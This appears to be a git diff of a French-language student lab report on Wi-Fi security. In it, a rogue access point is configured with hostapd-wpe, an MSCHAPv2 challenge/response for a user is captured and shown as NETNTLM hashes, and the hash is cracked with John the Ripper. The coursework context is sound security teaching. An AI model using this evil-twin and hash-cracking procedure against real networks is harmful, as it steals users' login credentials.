@@ -124,26 +124,41 @@ Il est également nécessaire de définir l'interface d'écoute.
 
 ```shell
 # Interface ...
-interface=wlan0
+interface=wlan0mon
 
 # ...
 
 # 802.11 Options
-ssid=HEIG-VD-lr-dh
+ssid=HEIG-VD-Zbeubzbeub
 channel=1
 ```
 
 Mettre également l'interface en monitor
 
 ```shell
-sudo airmon-ng start wlan0
+sudo airmon-ng start wlan0mon
 ```
 
-> **Question:_** Quel type de hash doit-on indiquer à john pour craquer le handshake ?
+```shell
+Configuration file: /etc/hostapd-wpe/hostapd-wpe.conf
+Using interface wlan0mon with hwaddr 00:c0:ca:90:01:b9 and ssid "HEIG-VD-Zbeubzbeub"
+```
+
+> Question:_** Quel type de hash doit-on indiquer à john pour craquer le handshake ?
 > 
 > **_Réponse:_** 
 
-> > > > > > >>>>>Ajouter la capture d'écran.
+```shell
+mschapv2: Sun Jun  2 08:47:19 2019
+	 username:	labinot
+	 challenge:	09:80:5b:35:c3:9b:76:43
+	 response:	ec:dd:e1:2f:6e:0d:8b:7c:75:f2:64:c6:f6:60:fa:05:2c:23:26:b7:f8:5f:86:c1
+	 jtr NETNTLM:		labinot:$NETNTLM$09805b35c39b7643$ecdde12f6e0d8b7c75f264c6f660fa052c2326b7f85f86c1
+	 hashcat NETNTLM:	labinot::::ecdde12f6e0d8b7c75f264c6f660fa052c2326b7f85f86c1:09805b35c39b7643	 
+	 
+wlan0mon: STA 4c:d1:a1:2f:d7:33 IEEE 802.1X: Identity received from STA: 'labinot'
+wlan0mon: STA 4c:d1:a1:2f:d7:33 IEEE 802.1X: Identity received from STA: 'labinot'
+```
 
 ``NETNTLM``
 
@@ -172,9 +187,7 @@ Configuration
 sudo john --format=netntlm hash.txt
 ```
 
-```shell
-# LE FICHIER DE CONFIG 
-```
+![john.jpg](./img/john.jpg)
 
 
 ## Quelques éléments à considérer :
